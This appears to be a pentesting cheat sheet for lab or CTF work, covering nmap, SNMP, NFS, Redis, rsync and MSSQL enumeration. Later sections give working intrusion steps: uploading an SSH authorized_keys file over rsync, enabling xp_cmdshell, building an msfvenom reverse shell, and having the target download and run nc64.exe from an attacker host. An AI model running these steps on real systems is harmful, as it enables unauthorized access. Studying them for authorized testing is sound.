# Recon and Enumeration

### Table of Contents

* [Recon and Enumeration](recon-enumeration.md#recon-and-enumeration)
  * [Table of Contents](recon-enumeration.md#table-of-contents)
  * [AutoRecon](recon-enumeration.md#autorecon)
  * [General Enumeration Figure out the Hosts and Services Running](recon-enumeration.md#general-enumeration-figure-out-the-hosts-and-services-running)
    * [NetDiscover](recon-enumeration.md#netdiscover)
    * [Nmap](recon-enumeration.md#nmap)
      * [Ping Scan -sn Option](recon-enumeration.md#ping-scan--sn-option)
      * [TCP Connect Scan](recon-enumeration.md#tcp-connect-scan)
      * [TCP SYN Scan](recon-enumeration.md#tcp-syn-scan)
      * [UDP Port Scanning](recon-enumeration.md#udp-port-scanning)
      * [Fingerprint Services](recon-enumeration.md#fingerprint-services)
      * [Scanning port ranges with Nmap](recon-enumeration.md#scanning-port-ranges-with-nmap)
    * [NSE](recon-enumeration.md#nse)
  * [Vulnerability Scanning](recon-enumeration.md#vulnerability-scanning)
  * [SMTP Port 25 default](recon-enumeration.md#smtp-port-25-default)
    * [SMTP User Enum](recon-enumeration.md#smtp-user-enum)
  * [POP3 Port 110 default](recon-enumeration.md#pop3-port-110-default)
  * [SNMP Ports 161, 162 default](recon-enumeration.md#snmp-ports-161--162-default)
    * [Onesixtyone](recon-enumeration.md#onesixtyone)
    * [SNMPwalk](recon-enumeration.md#snmpwalk)
  * [NFS](recon-enumeration.md#nfs)
  * [SMB Enumeration](recon-enumeration.md#smb-enumeration)
    * [SMB Checklist](recon-enumeration.md#smb-checklist)
    * [smbmap](recon-enumeration.md#smbmap)
    * [smbclient](recon-enumeration.md#smbclient)
    * [rpcclient](recon-enumeration.md#rpcclient)
    * [Enum4linux](recon-enumeration.md#enum4linux)
    * [Nmap SMB scripts](recon-enumeration.md#nmap-smb-scripts)
  * [Search services vulnerabilities](recon-enumeration.md#search-services-vulnerabilities)
  * [redis port 6379](recon-enumeration.md#redis-port-6379)
  * [Rsync port 873](recon-enumeration.md#rsync-port-873)
  * [Stuck](recon-enumeration.md#stuck)

## AutoRecon

* Always start here, trust me.

```
autorecon -ct 2 -cs 2 -vv -o outputdir 192.168.1.100 192.168.1.1/30 localhost
autorecon 10.200.97.200
autorecon -t targets.txt — only-scans-dir
```

* `-ct` (concurrent targets)
* `-o` custom output directory location.
* `-cs` limits the number of concurent scans per target
* Auto recon will create and store the results in the `/results` directory.

## General Enumeration Figure out the Hosts and Services Running

### NetDiscover

* Netdiscover is an active/passive reconnaissance tool that uses ARP to find live hosts on a local network.
* Netdiscover actively searches for live hosts on the network by broadcasting ARP requests like a router.
* By default netdiscover operates in active mode, however you can use it in passive mode with `-p`. With passive move it will not broadcast anything.
* Note: ARP is unable to cross network boundaries or over any VPN connection

```
netdiscover -r 10.11.1.0/24
```

### Nmap

* I have no time to read, just give me the nmap scanning meta.

```
nmap -sS x.x.x.x -p- --min-rate 10000
nmap -A -T5 x.x.x.x -p- -vv
nmap --script=scriptname.nse x.x.x.x -vv
```

#### Ping Scan -sn Option

* \-sn tells nmap to perform host discovery only without any additional port scanning and prints out details of any hosts that responded.

```
nmap -sn 10.11.1.0/24
```

* nmap also has the -Pn option which will disable the host discovery stage altogether on a scan. The -Pn option is best used in combination with other scans.

#### TCP Connect Scan

* The TCP connect scan in Nmap is the alternative TCP scan to use when a SYN scan is not an option.
* TCP connect scan should be used when nmap does not have raw packet privileges which is required for a SYN scan.

```
nmap -sT [target host]
```

#### TCP SYN Scan

* Does not complete the 3 way handshake

```
nmap -sS [target host]
```

#### UDP Port Scanning

* Always check for UDP ports will pick up DNS, NTP, SNMP

```
nmap -sU [target host]
nmap -sU -F [target host]
```

#### Fingerprint Services

* To figure out what services are running on target ports we use:

```
nmap -sV [target ip address]
```

* The following command will use nmap port scan to detect the service and OS:

```
nmap -sV -O [target ip address]
```

* Can also use the -A option in Nmap. The A stands for aggressive scan options and enables OS detection, script scanning and traceroute.

```
nmap -A [target ip address]
```

#### Scanning port ranges with Nmap

* By default nmap will only scan the most 1000 common ports. To override the default use the -p

```
nmap -p 1-100 [target host]
nmap -p 137-139,445 [target host]
```

### NSE

* Web Application Vulnerability scan:

```
nmap --script=http-vuln* 10.10.10.10
```

* Location of scripts

```
/usr/share/nmap/scripts
```

* Scripts are sorted by protocol, can sort by service

```
ls -l /usr/share/nmap/scripts/ftp*
```

* Nmap script help

```
nmap --script-help ftp-anon
```

* Nmap script execution

```
nmap --script=[script name] [target host]
```

* The following command executes a script names http-robots.txt on port 80:

```
nmap --script=http-robots.txt.nse [target host]
```

## Vulnerability Scanning

* Good nmap command

```
nmap -T4 -n -sC -sV -p- -oN nmap-versions --script='*vuln*' [ip]
```

```
nmap -p 80 --script=all $ip - Scan a target using all NSE scripts. May take an hour to complete.
nmap -p 80 --script=*vuln* $ip - Scan a target using all NSE vuln scripts.
nmap -p 80 --script=http*vuln* $ip  - Scan a target using all HTTP vulns NSE scripts.
nmap -p 21 --script=ftp-anon $ip/24 - Scan entire network for FTP servers that allow anonymous access.
nmap -p 80 --script=http-vuln-cve2010-2861 $ip/24 - Scan entire network for a directory traversal vulnerability. It can even retrieve admin's password hash.
```



###

![nc ftp](https://user-images.githubusercontent.com/75596877/138183900-60957ad6-0460-44d9-b64a-14cbd2f6e4a1.png)

## SNMP Ports 161, 162 default

* Commands
* Read, write, trap, traversal command
* SNMP community strings
* Community strings are like a username or password that allows access to the managed device.
* There are three different community strings that allow a user to set 1 ready only commands, 2 read write commands and 3 traps.
* SNMPv3 community string is replaced with a user and password authentication.
* SNMPv1/v2 is factory default read only strings set to public and read write string set to private.

### Onesixtyone

* Onesixtyone is a fast tool to brute force SNMP community strings and take advantage of the connectionless protocol.
* Onesixtyone requires two arguments: a file that contains the list of community strings to try and the target host ip address.
* You can also provide a list of host IP addresses to be scanned by onesixtyone using the -i option.

```
onesixtyone #access help menu
onesixtyone -c snmp_community_strings_wordlist_onesixtyone.txt -p 161 192.168.43.161
```

* Location of wordlists

```
/usr/share/wordlists/seclists/Discovery/SNMP
```

### SNMPwalk

* Snmpwalk queries MIB values to retrieve information about the managed devices, but as a minimum requires a valid SNMP read only community string.
* Run snmpwalk with the default community string ‘public’ on and SNMPv1 device use the following command:

```
snmpwalk -c public -v1 [target host]
```

* You can also request a single object ID value using the following command:

```
snmpwalk -c public -v1 [target host] [OID]
```

* Nmap SNMP scripts

```
ls -l /usr/share/nmap/scripts/snmp*
```

## NFS

* If there is a nfs port open on the attack machine try to find the name of the share

```
showmount -e [target ip]
```

* This should return a path like seen below

```
/srv/hermes*
```

* Make a directory on your box to mount to the target share

```
mkdir hack
```

* Mount to the target

```
sudo mount -t nfs [target ip]:/srv/hermes ~/hack
```

## Search services vulnerabilities

```
searchsploit --exclude=dos -t apache 2.2.3
msfconsole; > search apache 2.2.3
```

## redis port 6379

* https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
* Enumeration

```
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```

* Manual Enumeration
* Redis is a text based protocol, you can just send the command in a socket and the returned values will be readable. Also remember that Redis can run using ssl/tls (but this is very weird).
* In a regular Redis instance you can just connect using nc or you could also use redis-cli

```
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```

* Run the `info` first, it will either dump the `redis` instance or say `-NOAUTH Authentication required.`
* Username / Password are stored in the `redis.conf` file by default

```
grep ^[^#] redis.conf
config set requirepass p@ss$12E45.
masteruser
```

* Get Connected

```
nc 10.10.63.208 6379
info
<server reply>
redis-cli -h 10.10.63.208
10.10.63.208:6379> info
NOAUTH Authentication required.
10.10.63.208:6379> AUTH B65Hx562.....
OK
```

* Authenticated Enumeration

```
Authenticated enumeration
If the Redis instance is accepting anonymous connections or you found some valid credentials, you can start enumerating the service with the following commands:
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```

* Dumping Database
* Inside Redis the databases are numbers starting from `0`. You can find if anyone is used in the output of the command info inside the "Keyspace" chunk:
* ![alt text](https://gblobscdn.gitbook.com/assets%2F-L\_2uGJGU7AVNRcqRvEi%2F-MCwrx6EQpaXH4dsxZl3%2F-MCxgtV3m0F2z4KAOOsB%2Fimage.png?)

```
if value is of type string -> GET <key>
if value is of type hash -> HGETALL <key>
if value is of type lists -> lrange <key> <start> <end>
if value is of type sets -> smembers <key>
if value is of type sorted sets -> ZRANGEBYSCORE <key> <min> <max>
```

* Use the TYPE command to check the type of value a key is mapping to:

```
type <key>
```

* redis RCE
* https://github.com/Ridter/redis-rce

## Rsync port 873

* Basic information
* rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification timesand sizes of files.

```
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy        	
NAS_Public     	
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```

* Enumerate shared folders
* An rsync module is essentially a directory share. These modules can optionally be protected by a password.
* This options lists the available modules and, optionally, determines if the module requires a password to access:

```
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```

* Manual Rsync
* List a shared folder

```
rsync -av --list-only rsync:/10.10.232.5/shared_name
```

* Copy all files to your local machine via the following command:

```
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```

* If you have credentials you can list/download a shared name using (the password will be prompted):

```
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```

* You could also upload some content using rsync (for example, in this case we can upload an authorized\_keys file to obtain access to the box):

```
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
#full command syntax below
rsync -av id_rsa.pub rsync://rsync-connect@10.10.63.208/files/sys-internal/.ssh/authorized_keys
```

* Find the rsyncd configuration file:

```
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```

* Inside the config file sometimes you could find the parameter `secrets file = /path/to/file` and this file could contains usernames and passwords allowed to authenticate to rsyncd.

## ms-sql-s port 1433

* Use `impacket mssqlclient.py` to connect

```
python mssqlclient.py ARCHETYPE/sql_svc@10.129.62.77 -windows-auth
```

* https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
* Check what is the role we have in the server

```
SELECT is_srvrolemember('sysadmin');
```

* If the output is 1 , it translates to True .
* Check to see if `xp_cmdshell` is enabled

```
SQL> EXEC xp_cmdshell 'net user';
```

* Set up the command execution through the `xp_cmdshell`:

```
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
```

* First as it’s disabled by default:

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

* Now we are able to execute system commands:

```
xp_cmdshell "whoami"
```

* Better Command Execution

```
xp_cmdshell "powershell -c pwd"
```

* Get a shell on target with `nc` or `msfvenom`

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.154 LPORT=80 -f exe -o shell.exe
python3 -m http.server
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe; ./nc64.exe"
```

* Find the admin password from the shell

```
python /usr/local/bin/psexec.py administrator@10.129.62.77
```

## Stuck

* https://book.hacktricks.xyz/
* https://guide.offsecnewbie.com/
